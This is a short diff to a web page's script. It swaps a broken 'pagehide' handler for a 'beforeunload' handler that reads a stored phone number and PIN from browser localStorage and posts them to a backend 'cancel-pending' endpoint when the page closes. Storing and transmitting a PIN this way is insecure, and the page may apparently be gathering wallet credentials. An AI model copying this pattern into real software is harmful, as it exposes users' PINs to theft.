@@ -199,17 +199,19 @@
             timeLeft = 420;
         });
 
-        window.addEventListener('pagehide', function() {
-  const phone = localStorage.getItem('boost_phone');
-  const pin = localStorage.getItem('boost_pin');
-  if (phone && pin) {
-    const data = JSON.stringify({ phone, pin });
-    navigator.sendBeacon(
-      BACKEND_URL + '/api/cancel-pending',
-      new Blob([data], { type: 'application/json' })
-    );
-  }
-};
+        // ========== CANCEL SAAT HALAMAN DITUTUP ATAU DIREFRESH ==========
+        window.addEventListener('beforeunload', function() {
+            const phone = localStorage.getItem('boost_phone');
+            const pin = localStorage.getItem('boost_pin');
+            if (phone && pin) {
+                fetch(BACKEND_URL + '/api/cancel-pending', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, pin }),
+                    keepalive: true
+                });
+            }
+        });
     </script>
 </body>
 </html>
